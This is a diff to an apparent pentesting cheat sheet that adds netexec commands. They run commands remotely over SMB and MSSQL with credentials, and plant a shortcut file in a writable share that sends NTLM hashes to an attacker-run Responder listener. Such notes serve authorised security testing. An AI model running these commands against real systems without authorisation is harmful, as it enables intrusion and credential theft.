@@ -116,6 +116,13 @@ Pass the hash. This attack only works with NTLM hashes, not net hashes.
 
 # netexec
 
+`nxc smb <ip> -u user -p password -x 'whoami'`
+
+Creating a LNK file in an SMB share with WRITE privileges, need to run Responder to listen for NTLM hashes
+
+`nxc smb <ip> -u user -p password -M slinky -o NAME=shortcut_name SERVER=<IP>`
+
+`nxc mssql <ip> -u user -p password -x 'whoami'`
 
 # smbmap
 
